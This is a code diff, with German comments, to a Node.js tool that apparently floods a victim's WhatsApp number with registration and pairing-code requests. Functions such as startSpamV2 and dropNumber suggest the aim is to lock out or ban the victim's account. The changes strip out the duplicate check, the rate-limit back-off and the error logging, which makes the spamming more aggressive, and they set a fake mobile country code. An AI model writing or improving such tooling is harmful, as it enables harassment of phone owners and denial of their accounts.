@@ -13,7 +13,7 @@ const { startSpamV2, sendStoredData, startPairingCodeGeneration, sendStoredDataV
 
 // Konfiguration des Pino-Loggers mit gewünschten Log-Leveln
 const log = pinoo({
-    level: 'warn', // Nur Nachrichten mit Log-Level warn und höher werden protokolliert
+    level: 'info', // Nur Nachrichten mit Log-Level warn und höher werden protokolliert
     base: null // Deaktiviert den Standard-Serializer
 });
 
@@ -95,7 +95,7 @@ console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);
             // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
             const existingData = await SpamData.findOne({ ddi, number });
             if (existingData) {
-                return res.status(400).json({ error: 'Data already exists' });
+                
             } else {
                 // Neue Instanz des Modells erstellen und speichern
                 const newData = new SpamData({ ddi, number });
@@ -107,7 +107,7 @@ console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);
             const spam = makeWaSocket({
                 auth: state,
                 mobile: true,
-                logger: pino({ level: 'silent' }),
+                logger: pinoo({ level: 'silent' }),
             });
             const phoneNumber = ddi + number;
             await dropNumber(spam, phoneNumber, ddi, number);
@@ -127,16 +127,11 @@ console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);
                     phoneNumber: '+' + phoneNumber,
                     phoneNumberCountryCode: ddi,
                     phoneNumberNationalNumber: number,
-                    phoneNumberMobileCountryCode: 262,
+                    phoneNumberMobileCountryCode: 666,
                 });
-                const temporarilyUnavailable = res.reason === 'temporarily_unavailable';
-                if (temporarilyUnavailable) {
-                    console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
-                    await new Promise(resolve => setTimeout(resolve, res.retry_after * 10));
-                }
+                
             } catch (error) {
-                console.log(error);
-                // Möglicherweise weitere Fehlerbehandlung erforderlich
+               
             }
         }
     }
